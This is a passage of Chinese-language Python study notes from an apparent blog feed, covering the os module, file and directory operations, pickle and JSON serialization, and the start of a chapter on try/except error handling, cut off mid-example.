操作文件和目录</h2><p>如果我们要操作文件、目录，可以在命令行下面输入操作系统提供的各种命令来完成。比如<code>dir</code>、<code>cp</code>等命令。</p><p>如果要在Python程序中执行这些目录和文件的操作怎么办？其实操作系统提供的命令只是简单地调用了操作系统提供的接口函数，Python内置的<code>os</code>模块也可以直接调用操作系统提供的接口函数。</p><p>打开Python交互式命令行，我们来看看如何使用<code>os</code>模块的基本功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; os.name # 操作系统类型</span><br><span class="line">&#x27;posix&#x27;</span><br></pre></td></tr></table></figure><p>如果是<code>posix</code>，说明系统是<code>Linux</code>、<code>Unix</code>或<code>Mac OS X</code>，如果是<code>nt</code>，就是<code>Windows</code>系统。</p><p>要获取详细的系统信息，可以调用<code>uname()</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.uname()</span><br><span class="line">posix.uname_result(sysname=&#x27;Darwin&#x27;, nodename=&#x27;MichaelMacPro.local&#x27;, release=&#x27;14.3.0&#x27;, version=&#x27;Darwin Kernel Version 14.3.0: Mon Mar 23 11:59:05 PDT 2015; root:xnu-2782.20.48~5/RELEASE_X86_64&#x27;, machine=&#x27;x86_64&#x27;)</span><br></pre></td></tr></table></figure><p>注意<code>uname()</code>函数在Windows上不提供，也就是说，<code>os</code>模块的某些函数是跟操作系统相关的。</p><h3 id="9-3-1-环境变量"><a href="#9-3-1-环境变量" class="headerlink" title="9.3.1 环境变量"></a>9.3.1 环境变量</h3><p>在操作系统中定义的环境变量，全部保存在<code>os.environ</code>这个变量中，可以直接查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.environ</span><br><span class="line">environ(&#123;&#x27;VERSIONER_PYTHON_PREFER_32_BIT&#x27;: &#x27;no&#x27;, &#x27;TERM_PROGRAM_VERSION&#x27;: &#x27;326&#x27;, &#x27;LOGNAME&#x27;: &#x27;michael&#x27;, &#x27;USER&#x27;: &#x27;michael&#x27;, &#x27;PATH&#x27;: &#x27;/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/opt/X11/bin:/usr/local/mysql/bin&#x27;, ...&#125;)</span><br></pre></td></tr></table></figure><p>要获取某个环境变量的值，可以调用<code>os.environ.get(&#39;key&#39;)</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.environ.get(&#x27;PATH&#x27;)</span><br><span class="line">&#x27;/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/opt/X11/bin:/usr/local/mysql/bin&#x27;</span><br><span class="line">&gt;&gt;&gt; os.environ.get(&#x27;x&#x27;, &#x27;default&#x27;)</span><br><span class="line">&#x27;default&#x27;</span><br></pre></td></tr></table></figure><h3 id="9-3-2-操作文件和目录"><a href="#9-3-2-操作文件和目录" class="headerlink" title="9.3.2 操作文件和目录"></a>9.3.2 操作文件和目录</h3><p>操作文件和目录的函数一部分放在<code>os</code>模块中，一部分放在<code>os.path</code>模块中，这一点要注意一下。查看、创建和删除目录可以这么调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前目录的绝对路径:</span><br><span class="line">&gt;&gt;&gt; os.path.abspath(&#x27;.&#x27;)</span><br><span class="line">&#x27;/Users/michael&#x27;</span><br><span class="line"># 在某个目录下创建一个新目录，首先把新目录的完整路径表示出来:</span><br><span class="line">&gt;&gt;&gt; os.path.join(&#x27;/Users/michael&#x27;, &#x27;testdir&#x27;)</span><br><span class="line">&#x27;/Users/michael/testdir&#x27;</span><br><span class="line"># 然后创建一个目录:</span><br><span class="line">&gt;&gt;&gt; os.mkdir(&#x27;/Users/michael/testdir&#x27;)</span><br><span class="line"># 删掉一个目录:</span><br><span class="line">&gt;&gt;&gt; os.rmdir(&#x27;/Users/michael/testdir&#x27;)</span><br></pre></td></tr></table></figure><p>把两个路径合成一个时，不要直接拼字符串，而要通过<code>os.path.join()</code>函数，这样可以正确处理不同操作系统的路径分隔符。在Linux&#x2F;Unix&#x2F;Mac下，<code>os.path.join()</code>返回这样的字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">part-1/part-2</span><br></pre></td></tr></table></figure><p>而Windows下会返回这样的字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">part-1\part-2</span><br></pre></td></tr></table></figure><p>同样的道理，要拆分路径时，也不要直接去拆字符串，而要通过<code>os.path.split()</code>函数，这样可以把一个路径拆分为两部分，后一部分总是最后级别的目录或文件名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.split(&#x27;/Users/michael/testdir/file.txt&#x27;)</span><br><span class="line">(&#x27;/Users/michael/testdir&#x27;, &#x27;file.txt&#x27;)</span><br></pre></td></tr></table></figure><p><code>os.path.splitext()</code>可以直接让你得到文件扩展名，很多时候非常方便：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.splitext(&#x27;/path/to/file.txt&#x27;)</span><br><span class="line">(&#x27;/path/to/file&#x27;, &#x27;.txt&#x27;)</span><br></pre></td></tr></table></figure><p>这些合并、拆分路径的函数并不要求目录和文件要真实存在，它们只对字符串进行操作。</p><p>文件操作使用下面的函数。假定当前目录下有一个<code>test.txt</code>文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 对文件重命名:</span><br><span class="line">&gt;&gt;&gt; os.rename(&#x27;test.txt&#x27;, &#x27;test.py&#x27;)</span><br><span class="line"># 删掉文件:</span><br><span class="line">&gt;&gt;&gt; os.remove(&#x27;test.py&#x27;)</span><br></pre></td></tr></table></figure><p>但是复制文件的函数居然在<code>os</code>模块中不存在！原因是复制文件并非由操作系统提供的系统调用。理论上讲，我们通过上一节的读写文件可以完成文件复制，只不过要多写很多代码。</p><p>幸运的是<code>shutil</code>模块提供了<code>copyfile()</code>的函数，你还可以在<code>shutil</code>模块中找到很多实用函数，它们可以看做是<code>os</code>模块的补充。</p><p>最后看看如何利用Python的特性来过滤文件。比如我们要列出当前目录下的所有目录，只需要一行代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [x for x in os.listdir(&#x27;.&#x27;) if os.path.isdir(x)]</span><br><span class="line">[&#x27;.lein&#x27;, &#x27;.local&#x27;, &#x27;.m2&#x27;, &#x27;.npm&#x27;, &#x27;.ssh&#x27;, &#x27;.Trash&#x27;, &#x27;.vim&#x27;, &#x27;Applications&#x27;, &#x27;Desktop&#x27;, ...]</span><br></pre></td></tr></table></figure><p>要列出所有的<code>.py</code>文件，也只需一行代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [x for x in os.listdir(&#x27;.&#x27;) if os.path.isfile(x) and os.path.splitext(x)[1]==&#x27;.py&#x27;]</span><br><span class="line">[&#x27;apis.py&#x27;, &#x27;config.py&#x27;, &#x27;models.py&#x27;, &#x27;pymonitor.py&#x27;, &#x27;test_db.py&#x27;, &#x27;urls.py&#x27;, &#x27;wsgiapp.py&#x27;]</span><br></pre></td></tr></table></figure><p>是不是非常简洁？</p><blockquote><p>小结：</p></blockquote><p>Python的<code>os</code>模块封装了操作系统的目录和文件操作，要注意这些函数有的在<code>os</code>模块中，有的在<code>os.path</code>模块中。</p><h2 id="9-4-序列化"><a href="#9-4-序列化" class="headerlink" title="9.4 序列化"></a>9.4 序列化</h2><p>在程序运行的过程中，所有的变量都是在内存中，比如，定义一个dict：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d = dict(name=&#x27;Bob&#x27;, age=20, score=88)</span><br></pre></td></tr></table></figure><p>可以随时修改变量，比如把<code>name</code>改成<code>&#39;Bill&#39;</code>，但是一旦程序结束，变量所占用的内存就被操作系统全部回收。如果没有把修改后的<code>&#39;Bill&#39;</code>存储到磁盘上，下次重新运行程序，变量又被初始化为<code>&#39;Bob&#39;</code>。</p><p>我们把变量从内存中变成可存储或传输的过程称之为序列化，在Python中叫pickling，在其他语言中也被称之为serialization，marshalling，flattening等等，都是一个意思。</p><p>序列化之后，就可以把序列化后的内容写入磁盘，或者通过网络传输到别的机器上。</p><p>反过来，把变量内容从序列化的对象重新读到内存里称之为反序列化，即unpickling。</p><p>Python提供了<code>pickle</code>模块来实现序列化。</p><p>首先，我们尝试把一个对象序列化并写入文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import pickle</span><br><span class="line">&gt;&gt;&gt; d = dict(name=&#x27;Bob&#x27;, age=20, score=88)</span><br><span class="line">&gt;&gt;&gt; pickle.dumps(d)</span><br><span class="line">b&#x27;\x80\x03&#125;q\x00(X\x03\x00\x00\x00ageq\x01K\x14X\x05\x00\x00\x00scoreq\x02KXX\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00Bobq\x04u.&#x27;</span><br></pre></td></tr></table></figure><p><code>pickle.dumps()</code>方法把任意对象序列化成一个<code>bytes</code>，然后，就可以把这个<code>bytes</code>写入文件。或者用另一个方法<code>pickle.dump()</code>直接把对象序列化后写入一个file-like Object：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = open(&#x27;dump.txt&#x27;, &#x27;wb&#x27;)</span><br><span class="line">&gt;&gt;&gt; pickle.dump(d, f)</span><br><span class="line">&gt;&gt;&gt; f.close()</span><br></pre></td></tr></table></figure><p>看看写入的<code>dump.txt</code>文件，一堆乱七八糟的内容，这些都是Python保存的对象内部信息。</p><p>当我们要把对象从磁盘读到内存时，可以先把内容读到一个<code>bytes</code>，然后用<code>pickle.loads()</code>方法反序列化出对象，也可以直接用<code>pickle.load()</code>方法从一个<code>file-like Object</code>中直接反序列化出对象。我们打开另一个Python命令行来反序列化刚才保存的对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = open(&#x27;dump.txt&#x27;, &#x27;rb&#x27;)</span><br><span class="line">&gt;&gt;&gt; d = pickle.load(f)</span><br><span class="line">&gt;&gt;&gt; f.close()</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&#x27;age&#x27;: 20, &#x27;score&#x27;: 88, &#x27;name&#x27;: &#x27;Bob&#x27;&#125;</span><br></pre></td></tr></table></figure><p>变量的内容又回来了！</p><p>当然，这个变量和原来的变量是完全不相干的对象，它们只是内容相同而已。</p><p>Pickle的问题和所有其他编程语言特有的序列化问题一样，就是它只能用于Python，并且可能不同版本的Python彼此都不兼容，因此，只能用Pickle保存那些不重要的数据，不能成功地反序列化也没关系。</p><h3 id="9-4-1-JSON"><a href="#9-4-1-JSON" class="headerlink" title="9.4.1 JSON"></a>9.4.1 JSON</h3><p>如果我们要在不同的编程语言之间传递对象，就必须把对象序列化为标准格式，比如XML，但更好的方法是序列化为JSON，因为JSON表示出来就是一个字符串，可以被所有语言读取，也可以方便地存储到磁盘或者通过网络传输。JSON不仅是标准格式，并且比XML更快，而且可以直接在Web页面中读取，非常方便。</p><p>JSON表示的对象就是标准的JavaScript语言的对象，JSON和Python内置的数据类型对应如下：</p><p><img src="https://cos.gjcloak.xyz/images/01/20200821082804.png" alt="image-20200821082756404" title="image-20200821082756404"></p><p>Python内置的<code>json</code>模块提供了非常完善的Python对象到JSON格式的转换。我们先看看如何把Python对象变成一个JSON：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import json</span><br><span class="line">&gt;&gt;&gt; d = dict(name=&#x27;Bob&#x27;, age=20, score=88)</span><br><span class="line">&gt;&gt;&gt; json.dumps(d)</span><br><span class="line">&#x27;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure><p><code>dumps()</code>方法返回一个<code>str</code>，内容就是标准的JSON。类似的，<code>dump()</code>方法可以直接把JSON写入一个<code>file-like Object</code>。</p><p>要把JSON反序列化为Python对象，用<code>loads()</code>或者对应的<code>load()</code>方法，前者把JSON的字符串反序列化，后者从<code>file-like Object</code>中读取字符串并反序列化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; json_str = &#x27;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&#x27;</span><br><span class="line">&gt;&gt;&gt; json.loads(json_str)</span><br><span class="line">&#123;&#x27;age&#x27;: 20, &#x27;score&#x27;: 88, &#x27;name&#x27;: &#x27;Bob&#x27;&#125;</span><br></pre></td></tr></table></figure><p>由于JSON标准规定JSON编码是UTF-8，所以我们总是能正确地在Python的<code>str</code>与JSON的字符串之间转换。</p><h3 id="9-4-2-JSON-进阶"><a href="#9-4-2-JSON-进阶" class="headerlink" title="9.4.2 JSON 进阶"></a>9.4.2 JSON 进阶</h3><p>Python的<code>dict</code>对象可以直接序列化为JSON的<code>&#123;&#125;</code>，不过，很多时候，我们更喜欢用<code>class</code>表示对象，比如定义<code>Student</code>类，然后序列化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line"></span><br><span class="line">class Student(object):</span><br><span class="line">    def __init__(self, name, age, score):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        self.score = score</span><br><span class="line"></span><br><span class="line">s = Student(&#x27;Bob&#x27;, 20, 88)</span><br><span class="line">print(json.dumps(s))</span><br></pre></td></tr></table></figure><p>运行代码，毫不留情地得到一个<code>TypeError</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">TypeError: &lt;__main__.Student object at 0x10603cc50&gt; is not JSON serializable</span><br></pre></td></tr></table></figure><p>错误的原因是<code>Student</code>对象不是一个可序列化为JSON的对象。</p><p>如果连<code>class</code>的实例对象都无法序列化为JSON，这肯定不合理！</p><p>别急，我们仔细看看<code>dumps()</code>方法的参数列表，可以发现，除了第一个必须的<code>obj</code>参数外，<code>dumps()</code>方法还提供了一大堆的可选参数：</p><p><a href="https://docs.python.org/3/library/json.html#json.dumps">https://docs.python.org/3/library/json.html#json.dumps</a></p><p>这些可选参数就是让我们来定制JSON序列化。前面的代码之所以无法把<code>Student</code>类实例序列化为JSON，是因为默认情况下，<code>dumps()</code>方法不知道如何将<code>Student</code>实例变为一个JSON的<code>&#123;&#125;</code>对象。</p><p>可选参数<code>default</code>就是把任意一个对象变成一个可序列为JSON的对象，我们只需要为<code>Student</code>专门写一个转换函数，再把函数传进去即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def student2dict(std):</span><br><span class="line">    return &#123;</span><br><span class="line">        &#x27;name&#x27;: std.name,</span><br><span class="line">        &#x27;age&#x27;: std.age,</span><br><span class="line">        &#x27;score&#x27;: std.score</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这样，<code>Student</code>实例首先被<code>student2dict()</code>函数转换成<code>dict</code>，然后再被顺利序列化为JSON：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(json.dumps(s, default=student2dict))</span><br><span class="line">&#123;&quot;age&quot;: 20, &quot;name&quot;: &quot;Bob&quot;, &quot;score&quot;: 88&#125;</span><br></pre></td></tr></table></figure><p>不过，下次如果遇到一个<code>Teacher</code>类的实例，照样无法序列化为JSON。我们可以偷个懒，把任意<code>class</code>的实例变为<code>dict</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(json.dumps(s, default=lambda obj: obj.__dict__))</span><br></pre></td></tr></table></figure><p>因为通常<code>class</code>的实例都有一个<code>__dict__</code>属性，它就是一个<code>dict</code>，用来存储实例变量。也有少数例外，比如定义了<code>__slots__</code>的class。</p><p>同样的道理，如果我们要把JSON反序列化为一个<code>Student</code>对象实例，<code>loads()</code>方法首先转换出一个<code>dict</code>对象，然后，我们传入的<code>object_hook</code>函数负责把<code>dict</code>转换为<code>Student</code>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ef dict2student(d):</span><br><span class="line">    return Student(d[&#x27;name&#x27;], d[&#x27;age&#x27;], d[&#x27;score&#x27;])</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; json_str = &#x27;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&#x27;</span><br><span class="line">&gt;&gt;&gt; print(json.loads(json_str, object_hook=dict2student))</span><br><span class="line">&lt;__main__.Student object at 0x10cd3c190&gt;</span><br></pre></td></tr></table></figure><p>打印出的是反序列化的<code>Student</code>实例对象。</p><blockquote><p>小结：</p></blockquote><p>Python语言特定的序列化模块是<code>pickle</code>，但如果要把序列化搞得更通用、更符合Web标准，就可以使用<code>json</code>模块。</p><p><code>json</code>模块的<code>dumps()</code>和<code>loads()</code>函数是定义得非常好的接口的典范。当我们使用时，只需要传入一个必须的参数。但是，当默认的序列化或反序列机制不满足我们的要求时，我们又可以传入更多的参数来定制序列化或反序列化的规则，既做到了接口简单易用，又做到了充分的扩展性和灵活性。</p><h2 id="9-5-参考资料"><a href="#9-5-参考资料" class="headerlink" title="9.5 参考资料"></a>9.5 参考资料</h2><ul><li><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017606916795776">廖雪峰 - Python 3.x - IO 编程</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> IO编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习笔记(八)·错误、调试和测试</title>
      <link href="/102.html"/>
      <url>/102.html</url>
      
        <content type="html"><![CDATA[<p>在程序运行过程中，总会遇到各种各样的错误。</p><p>有的错误是程序编写有问题造成的，比如本来应该输出整数结果输出了字符串，这种错误我们通常称之为bug，bug是必须修复的。</p><p>有的错误是用户输入造成的，比如让用户输入email地址，结果得到一个空字符串，这种错误可以通过检查用户输入来做相应的处理。</p><p>还有一类错误是完全无法在程序运行过程中预测的，比如写入文件的时候，磁盘满了，写不进去了，或者从网络抓取数据，网络突然断掉了。这类错误也称为异常，在程序中通常是必须处理的，否则，程序会因为各种问题终止并退出。</p><p>Python内置了一套异常处理机制，来帮助我们进行错误处理。</p><p>此外，我们也需要跟踪程序的执行，查看变量的值是否正确，这个过程称为调试。Python的pdb可以让我们以单步方式执行代码。</p><p>最后，编写测试也很重要。有了良好的测试，就可以在程序修改后反复运行，确保程序输出符合我们编写的测试。</p><h2 id="8-1-错误处理"><a href="#8-1-错误处理" class="headerlink" title="8.1 错误处理"></a>8.1 错误处理</h2><p>在程序运行的过程中，如果发生了错误，可以事先约定返回一个错误代码，这样，就可以知道是否有错，以及出错的原因。在操作系统提供的调用中，返回错误码非常常见。比如打开文件的函数<code>open()</code>，成功时返回文件描述符（就是一个整数），出错时返回<code>-1</code>。</p><p>用错误码来表示是否出错十分不便，因为函数本身应该返回的正常结果和错误码混在一起，造成调用者必须用大量的代码来判断是否出错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def foo():</span><br><span class="line">    r = some_function()</span><br><span class="line">    if r==(-1):</span><br><span class="line">        return (-1)</span><br><span class="line">    # do something</span><br><span class="line">    return r</span><br><span class="line"></span><br><span class="line">def bar():</span><br><span class="line">    r = foo()</span><br><span class="line">    if r==(-1):</span><br><span class="line">        print(&#x27;Error&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><p>一旦出错，还要一级一级上报，直到某个函数可以处理该错误（比如，给用户输出一个错误信息）。</p><p>所以高级语言通常都内置了一套<code>try...except...finally...</code>的错误处理机制，Python也不例外。</p><h3 id="8-1-1-try"><a href="#8-1-1-try" class="headerlink" title="8.1.1 try"></a>8.1.1 try</h3><p>让我们用一个例子来看看<code>try</code>的机制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    print(&#x27;try...&#x27;)</span><br><span class="line">    r = 10 / 0</span><br><span class="line">    print(&#x27;result:&#x27;, r)</span><br><span class="line">except ZeroDivisionError as e:</span><br><span class="line">    print(&#x27;except:&#x27;, e)</span><br><span class="line">finally:</span><br><span class="line">    print(&#x27;finally...&#x27;)</span><br><span class="line">print(&#x27;END&#x27;)</span><br></pre></td></tr></table></figure><p>当我们认为某些代码可能会出错时，就可以用<code>try</code>来运行这段代码，如果执行出错，则后续代码不会继续执行，而是直接跳转至错误处理代码，即<code>except</code>语句块，执行完<code>except</code>后，如果有<code>finally</code>语句块，则执行<code>finally</code>语句块，至此，执行完毕。</p><p>上面的代码在计算<code>10 / 0</code>时会产生一个除法运算错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try...</span><br><span class="line">except: division by zero</span><br><span class="line">finally...</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p>从输出可以看到，当错误发生时，后续语句<code>print(&#39;result:&#39;, r)</code>不会被执行，<code>except</code>由于捕获到<code>ZeroDivisionError</code>，因此被执行。最后，<code>finally</code>语句被执行。然后，程序继续按照流程往下走。</p><p>如果把除数<code>0</code>改成<code>2</code>，则执行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try...</span><br><span class="line">result: 5</span><br><span class="line">finally...</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p>由于没有错误发生，所以<code>except</code>语句块不会被执行，但是<code>finally</code>如果有，则一定会被执行（可以没有<code>finally</code>语句）。</p><p>你还可以猜测，错误应该有很多种类，如果发生了不同类型的错误，应该由不同的<code>except</code>语句块处理。没错，可以有多个<code>except</code>来捕获不同类型的错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    print(&#x27;try...&#x27;)</span><br><span class="line">    r = 10 / int(&#x27;a&#x27;)</span><br><span class="line">    print(&#x27;result:&#x27;, r)</span><br><span class="line">except ValueError as e:</span><br><span class="line">    print(&#x27;ValueError:&#x27;, e)</span><br><span class="line">except ZeroDivisionError as e:</span><br><span class="line">    print(&#x27;ZeroDivisionError:&#x27;, e)</span><br><span class="line">finally:</span><br><span class="line">    print(&#x27;finally...&#x27;)</span><br><span class="line">print(&#x27;END&#x27;)</span><br></pre></td></tr></table></figure><p><code>int()</code>函数可能会抛出<code>ValueError</code>，所以我们用一个<code>except</code>捕获<code>ValueError</code>，用另一个<code>except</code>捕获<code>ZeroDivisionError</code>。</p><p>此外，如果没有错误发生，可以在<code>except</code>语句块后面加一个<code>else</code>，当没有错误发生时，会自动执行<code>else</code>语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    print(&#x27;try...&#x27;)</span><br><span class="line">    r = 10 / int(&#x27;2&#x27;)</span><br><span class="line">    print(&#x27;result:&#x27;, r)</span><br><span class="line">except ValueError as e:</span><br><span class="line">    print(&#x27;ValueError:&#x27;, e)</span><br><span class="line">except ZeroDivisionError as e:</span><br><span class="line">    print(&#x27;ZeroDivisionError:&#x27;, e)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;no error!&#x27;)</span><br><span class="line">finally:</span><br><span class="line">    print(&#x27;finally...&#x27;)</span><br><span class="line">print(&#x27;END&#x27;)</span><br></pre></td></tr></table></figure><p>Python的错误其实也是class，所有的错误类型都继承自<code>BaseException</code>，所以在使用<code>except</code>时需要注意的是，它不但捕获该类型的错误，还把其子类也“一网打尽”。比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    foo()</span><br><span class="line">except ValueError as e:</span><br><span class="line">    print(&#x27;ValueError&#x27;)</span><br><span class="line">except UnicodeError as e:</span><br><span class="line">    print(&#x27;UnicodeError&#x27;)</span><br></pre></td></tr></table></figure><p>第二个<code>except</code>永远也捕获不到<code>UnicodeError</code>，因为<code>UnicodeError</code>是<code>ValueError</code>的子类，如果有，也被第一个<code>except</code>给捕获了。</p><p>Python所有的错误都是从<code>BaseException</code>类派生的，常见的错误类型和继承关系看这里：</p><p><a href="https://docs.python.org/3/library/exceptions.html#exception-hierarchy">https://docs.python.org/3/library/exceptions.html#exception-hierarchy</a></p><p>使用<code>try...except</code>捕获错误还有一个巨大的好处，就是可以跨越多层调用，比如函数<code>main()</code>调用<code>bar()</code>，<code>bar()</code>调用<code>foo()</code>，结果<code>foo()</code>出错了，这时，只要<code>main()</code>捕获到了，就可以处理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def foo(s):</span><br><span class="line">    return 10 / int(s)</span><br><span class="line"></span><br><span class="line">def bar(s):</span><br><span class="line">    return foo(s) * 2</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    try:</span><br><span class="line">        bar(&#x27;0&#x27;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&#x27;Error:&#x27;, e)</span><br><span class="line">    finally:</span><br><span class="line">        